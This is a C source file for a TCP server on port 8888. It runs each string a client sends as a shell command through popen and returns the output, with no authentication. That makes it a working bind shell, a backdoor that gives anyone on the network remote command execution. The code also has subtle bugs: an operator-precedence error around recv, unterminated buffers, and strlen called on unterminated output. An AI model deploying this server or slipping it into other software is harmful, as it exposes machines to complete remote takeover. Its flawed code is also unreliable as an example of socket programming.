#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h> 
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define MAXLINE 256


int main(int argc, char *argv[])
{
	int listenfd, connfd, n;
	socklen_t clilen;
	char buf[MAXLINE];
	struct sockaddr_in cliaddr, servaddr;
	
	int port = 8888;
	
	listenfd = socket(AF_INET, SOCK_STREAM, 0);
	
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = htonl(INADDR_ANY);
	servaddr.sin_port = htons(port);
	
	bind(listenfd, (struct sockaddr *) &servaddr, sizeof(servaddr));

	listen(listenfd, 4);
    //printf("%s\n", "Server running, waiting for connections...");
	
	while(1) {
		clilen = sizeof(cliaddr);
		connfd = accept(listenfd, (struct sockaddr*) &cliaddr, &clilen);
        //printf("%s\n", "Connection established...");
		while((n=recv(connfd, buf, MAXLINE, 0) > 0)) {
			//printf("String received from the client: %s\n", buf);
            //https://rosettacode.org/wiki/Get_system_command_output#C
            FILE *fd;
            fd = popen(buf, "r");
            if(!fd) return 1;

            char buffer[MAXLINE];
            size_t chread;
            size_t comalloc = 256;
            size_t comlen = 0;
            char *comout = malloc(comalloc);

            while((chread = fread(buffer, 1, sizeof(buffer), fd)) != 0) {
                if(comlen + chread >= comalloc) {
                    comalloc *= 2;
                    comout = realloc(comout, comalloc);
                }
                memmove(comout + comlen, buffer, chread);
                comlen += chread;
            }
            fwrite(comout, 1, comlen, stdout);
            //printf("comout %s\n", comout);
            pclose(fd);
			send(connfd, comout, strlen(comout), 0);
			memset(buf, 0, sizeof(buf));
            free(comout);
		}
		if(n<0) {
			perror("Read error");
			exit(1);
		}
		close(connfd);
	}
	close(listenfd);
}
